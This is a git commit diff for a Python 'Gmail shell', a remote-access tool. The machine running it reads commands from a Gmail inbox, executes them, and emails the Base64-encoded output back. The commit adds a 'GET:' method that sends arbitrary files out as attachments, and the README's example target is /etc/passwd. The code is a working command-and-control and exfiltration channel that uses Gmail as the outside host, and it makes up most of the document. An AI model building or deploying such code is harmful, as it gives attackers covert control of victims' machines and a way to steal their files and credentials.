a4e6c8f2214fb56368fb897a010e04f2c1e1ae34
RiadhBenlamine <riadhria03@gmail.com>
2020-07-14 16:29:44 +0100

    New update

--- README.md
+++ README.md
@@ -4,7 +4,22 @@ It's all about sending command from your email to another email you own.
 
 ## How to use it
 
-Easy, all you need is create fake gmail account, go Enable less secure apps and then add it to *client.py* 'email_add' and 'passeord' and use another gmail account to send Commands and recive the output encoded Base64. for now works only for linux systems
+Easy, all you need is create fake gmail account, go Enable less secure apps and then add it to *client.py* 'EMAIL_ADD' and 'PASSWORD' and use another gmail account to send Commands and recive the output encoded Base64. for now works only for linux systems
+
+send email like ls to 'EMAIL_ADD' and you will recive the output in 'EMAIL_TO', decode the output done.
+
+### Run command line
+- Email your command to 'EMAIL_ADD'
+	ls
+
+### Get Files 
+- Email this to 'EMAIL_ADD'
+	GET:/etc/passwed
+
+## What's new 
+
+- Fixes and improvments
+- New method (get files) 
 
 ## TODO
 
@@ -16,9 +31,6 @@ Easy, all you need is create fake gmail account, go Enable less secure apps and 
 I won't take any responsability for your usage. Good luck
 
 ## Contact me?
-Via:
-Linkedin: Riadh Benlamine
-Or
-riadhriah03@gmail.com
 
-Please report your bugs/issues and will solve them as soon as possible
+	(Linkedin)[www.linkedin.com]
+	(Email)[emailto:riadhriah03@gmail.com]
--- client.py
+++ client.py
@@ -1,27 +1,33 @@
 #!/bin/env python
 
+'''
+ Simple gmail Shell written in python3 by @Riadh Benlamine.
+ __version__ = 1.1
+'''
+
 import imaplib
 import smtplib
 import email
 import subprocess
 import base64
 import multiprocessing
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 
-
-email_add = '' # Gmail of this payload
-password = '' # Password of this Gmail
-email_to = [''] # Gmails to send the output
+EMAIL_ADD = '' # Gmail of this payload
+PASSWORD = '' # Password of this Gmail
+EMAIL_TO = [''] # Gmails to send the output
 
 
 def mail():
+    ''' recive mails and return them '''
     try:
         mail = imaplib.IMAP4_SSL('imap.gmail.com')
-        mail.login(email_add, password)
-
+        mail.login(EMAIL_ADD, PASSWORD)
         mail.select('inbox')
-
         result, data = mail.uid('search', None, 'UnSeen')
-
         latest_email_uid = data[0].split()[-1]
         result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')
         raw_email = data[0][1]
@@ -34,28 +40,59 @@ def mail():
             if body is not None:
                 break
         return body.decode()
-    except Exception or IndexError:
+    except:
         return 0
 
-def send(data):
+def send(data=None, path=None):
+    ''' send email with this prams
+    data: any str
+    path: any file path
+    '''
     try:
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
-        server.login(email_add, password)
-        server.sendmail(email_add, email_to, str(data).encode())
+        server.login(EMAIL_ADD, PASSWORD)
+        if path is not None:
+            msg = MIMEMultipart()
+            msg['From'] = EMAIL_ADD
+            msg['To'] = ','.join(EMAIL_TO)
+            msg['Subject'] = "Gmail-Shell Output"
+            body = 'You requested file'
+            msg.attach(MIMEText(body, 'plain'))
+            file_name = path.split('/')[-1]
+            file_content = open(path, 'rb').read()
+            base = MIMEBase('application', 'octet-stream')
+            base.set_payload(file_content)
+            encoders.encode_base64(base)
+            base.add_header('Content-Disposition', f"attachment; filename= {file_name}")
+            msg.attach(base)
+            text = msg.as_string()
+            server.sendmail(EMAIL_ADD, EMAIL_TO, text)
+        if data:
+            server.sendmail(EMAIL_ADD, EMAIL_TO, str(data).encode())
     except:
         pass
 
+def analyzer(command):
+    ''' command should be str to check if there is one of methods '''
+    if 'GET:' in command:
+        file_path = command.replace("GET:", '')
+        send(path=file_path)
+    else:
+        pass
+
+
 def main():
+    ''' Main program '''
     command = mail()
     if isinstance(command, str):
         try:
             command = command.replace('\r', '').replace('\n', '')
+            analyzer(command)
             command_output = subprocess.run(command.split(" "), stdout=subprocess.PIPE).stdout.decode('utf-8')
             text = f"Output: {command_output}"
             payload = base64.b64encode(text.encode())
-            send(payload)
-
+            send(data=payload)
         except FileNotFoundError:
             pass
     else:
